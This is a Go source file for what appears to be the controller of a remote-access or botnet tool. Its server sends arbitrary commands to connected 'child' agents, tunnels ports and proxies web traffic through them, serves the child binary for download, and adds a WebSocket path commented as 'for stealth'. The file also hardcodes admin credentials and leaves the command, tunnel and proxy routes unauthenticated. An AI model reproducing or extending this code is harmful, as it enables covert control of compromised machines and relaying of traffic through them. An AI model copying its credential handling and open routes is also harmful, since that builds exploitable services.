package mother

import (
	"crypto/rand"
	"embed"
	"encoding/hex"
	"encoding/json"
	"io/fs"
	"log"
	"net/http"
	"strings"
	"sync"
	"time"
)

//go:embed web/*
var webAssets embed.FS

var (
	adminUsername = "huanx"
	adminPassword = "REDACTED1"
	adminSessions = sync.Map{} // token -> expiry
)

type adminSession struct {
	Token  string
	Expiry time.Time
}

func generateToken() string {
	b := make([]byte, 32)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func authMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		auth := r.Header.Get("Authorization")
		if !strings.HasPrefix(auth, "Bearer ") {
			http.Error(w, `{"error":"unauthorized"}`, 401)
			return
		}
		token := auth[7:]
		val, ok := adminSessions.Load(token)
		if !ok {
			http.Error(w, `{"error":"unauthorized"}`, 401)
			return
		}
		sess := val.(adminSession)
		if time.Now().After(sess.Expiry) {
			adminSessions.Delete(token)
			http.Error(w, `{"error":"session expired"}`, 401)
			return
		}
		next.ServeHTTP(w, r)
	})
}

func handleLogin(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", 405)
		return
	}
	var req struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, map[string]string{"error": "invalid request"})
		return
	}
	if req.Username != adminUsername || req.Password != adminPassword {
		writeJSON(w, map[string]string{"error": "用户名或密码错误"})
		return
	}
	token := generateToken()
	adminSessions.Store(token, adminSession{Token: token, Expiry: time.Now().Add(24 * time.Hour)})
	writeJSON(w, map[string]string{"token": token, "message": "登录成功"})
}

func handleCheck(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, map[string]bool{"valid": true})
}

// SetupRoutes registers all HTTP routes on the given mux.
func SetupRoutes(mux *http.ServeMux, hub *Hub, tm *TunnelManager) {
	// API — Children
	mux.HandleFunc("/api/children", func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case "GET":
			children := hub.ListChildren()
			writeJSON(w, map[string]interface{}{
				"children": children,
				"count":    len(children),
			})
		case "DELETE":
			// Disconnect a child
			id := r.URL.Query().Get("id")
			hub.mu.Lock()
			child, ok := hub.children[id]
			if ok {
				delete(hub.children, id)
			}
			hub.mu.Unlock()
			if ok && child.Transport == "http" {
				hub.httpMu.Lock()
				if q, ok := hub.httpQueues[id]; ok {
					close(q)
					delete(hub.httpQueues, id)
				}
				hub.httpMu.Unlock()
			} else if ok && child.Conn != nil {
				child.Conn.Close()
			}
			writeJSON(w, map[string]string{"status": "disconnected"})
		default:
			http.Error(w, "method not allowed", 405)
		}
	})

	// API — Tasks
	mux.HandleFunc("/api/tasks", func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case "POST":
			var req struct {
				ChildID string   `json:"child_id"`
				Command string   `json:"command"`
				Args    []string `json:"args"`
				Timeout int      `json:"timeout"`
			}
			if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
				writeJSON(w, map[string]string{"error": err.Error()})
				return
			}
			record, err := hub.SubmitTask(req.ChildID, req.Command, req.Args, req.Timeout)
			if err != nil {
				writeJSON(w, map[string]string{"error": err.Error()})
				return
			}
			writeJSON(w, record)

		case "GET":
			childID := r.URL.Query().Get("child_id")
			tasks := hub.ListTasks(childID)
			writeJSON(w, map[string]interface{}{
				"tasks": tasks,
				"count": len(tasks),
			})

		default:
			http.Error(w, "method not allowed", 405)
		}
	})

	// API — Single task
	mux.HandleFunc("/api/tasks/", func(w http.ResponseWriter, r *http.Request) {
		taskID := r.URL.Path[len("/api/tasks/"):]
		task := hub.GetTask(taskID)
		if task == nil {
			writeJSON(w, map[string]string{"error": "not found"})
			return
		}
		writeJSON(w, task)
	})

	// API — Tunnels
	mux.HandleFunc("/api/tunnels", func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case "POST":
			var req TunnelRequest
			if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
				writeJSON(w, map[string]string{"error": err.Error()})
				return
			}
			if req.ID == "" {
				req.ID = generateID()
			}

			// If no child_id specified, add ALL online children to pool
			if req.ChildID == "" {
				children := hub.ListChildren()
				if len(children) == 0 {
					writeJSON(w, map[string]string{"error": "no children online"})
					return
				}
				var tunnels []*Tunnel
				for i, c := range children {
					tid := req.ID
					if i > 0 {
						tid = generateID()
					}
					t, err := tm.OpenTunnel(tid, c.ID, req.Target, req.ListenPort)
					if err != nil {
						writeJSON(w, map[string]string{"error": err.Error()})
						return
					}
					tunnels = append(tunnels, t)
				}
				writeJSON(w, map[string]interface{}{
					"tunnels": tunnels,
					"count":   len(tunnels),
					"port":    req.ListenPort,
					"target":  req.Target,
				})
				return
			}

			tunnel, err := tm.OpenTunnel(req.ID, req.ChildID, req.Target, req.ListenPort)
			if err != nil {
				writeJSON(w, map[string]string{"error": err.Error()})
				return
			}
			writeJSON(w, tunnel)

		case "GET":
			writeJSON(w, map[string]interface{}{
				"tunnels": tm.ListTunnels(),
				"count":   len(tm.ListTunnels()),
			})

		default:
			http.Error(w, "method not allowed", 405)
		}
	})

	// API — Single tunnel
	mux.HandleFunc("/api/tunnels/", func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case "DELETE":
			tunnelID := r.URL.Path[len("/api/tunnels/"):]
			if err := tm.CloseTunnel(tunnelID); err != nil {
				writeJSON(w, map[string]string{"error": err.Error()})
				return
			}
			writeJSON(w, map[string]string{"status": "closed"})
		default:
			http.Error(w, "method not allowed", 405)
		}
	})

	// API — Stats
	mux.HandleFunc("/api/stats", func(w http.ResponseWriter, r *http.Request) {
		tasks := hub.ListTasks("")
		completed := 0
		for _, t := range tasks {
			if t.Status == TaskCompleted || t.Status == TaskFailed {
				completed++
			}
		}
		writeJSON(w, map[string]interface{}{
			"children":        hub.Count(),
			"tunnels":         len(tm.ListTunnels()),
			"tasks_total":     len(tasks),
			"tasks_completed": completed,
			"uptime":          time.Now().Unix(),
		})
	})

	// API — Events (SSE)
	mux.HandleFunc("/api/events", func(w http.ResponseWriter, r *http.Request) {
		WriteSSE(w, hub.Events())
	})

	// Auth
	mux.HandleFunc("/api/login", handleLogin)
	mux.Handle("/api/check", authMiddleware(http.HandlerFunc(handleCheck)))

	// Admin page
	mux.HandleFunc("/admin", func(w http.ResponseWriter, r *http.Request) {
		data, err := webAssets.ReadFile("web/admin.html")
		if err != nil {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Write(data)
	})

	// HTTP child long-poll transport
	SetupHTTPChildRoutes(mux, hub)

	// WS for children (both /ws and /api/stream for stealth)
	mux.HandleFunc("/ws", hub.HandleWS)
	mux.HandleFunc("/api/stream", hub.HandleWS)

	// HTTP Proxy via child nodes:
	//   /p/http/host/path   -> HTTP
	//   /p/https/host/path  -> HTTPS
	//   /p/host/path        -> HTTP (backward compat)
	mux.HandleFunc("/p/", func(w http.ResponseWriter, r *http.Request) {
		path := strings.TrimPrefix(r.URL.Path, "/p/")
		if path == "" || path == "/" {
			http.Error(w, "missing target", 400)
			return
		}

		// Check if first segment is http/https scheme hint
		useTLS := false
		if strings.HasPrefix(path, "http/") {
			path = path[5:] // strip "http/"
		} else if strings.HasPrefix(path, "https/") {
			useTLS = true
			path = path[6:] // strip "https/"
		}

		// Extract host[:port] from first path segment
		target := path
		if idx := strings.Index(path, "/"); idx >= 0 {
			target = path[:idx]
		}
		if !strings.Contains(target, ":") {
			if useTLS {
				target += ":443"
			} else {
				target += ":80"
			}
		}

		// Rewrite URL path so ProxyHTTP can strip correctly
		r.URL.Path = "/p/" + path
		r.URL.RawPath = ""
		r.RequestURI = r.URL.RequestURI()

		hub.ProxyHTTP(target, w, r)
	})

	// Download child binary
	mux.HandleFunc("/dl/child", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Disposition", "attachment; filename=child")
		http.ServeFile(w, r, "child-linux-amd64")
	})

	// WebUI
	webFS, err := fs.Sub(webAssets, "web")
	if err != nil {
		log.Printf("[mother] web assets not embedded: %v", err)
		mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path == "/" || r.URL.Path == "/index.html" {
				w.Header().Set("Content-Type", "text/html; charset=utf-8")
				w.Write([]byte(indexFallback))
				return
			}
			http.NotFound(w, r)
		})
		return
	}
	mux.Handle("/", http.FileServer(http.FS(webFS)))
}

func writeJSON(w http.ResponseWriter, v interface{}) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(v)
}

const indexFallback = `<!DOCTYPE html>
<html><head><title>hxの偷吃</title><meta charset="utf-8"></head>
<body style="background:#0b0b0f;color:#f5f5f5;font-family:Inter,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0">
<h1 style="font-weight:800;font-size:2rem">hxの偷吃 <span style="color:#d4143a">Mother</span> is online</h1>
</body></html>`
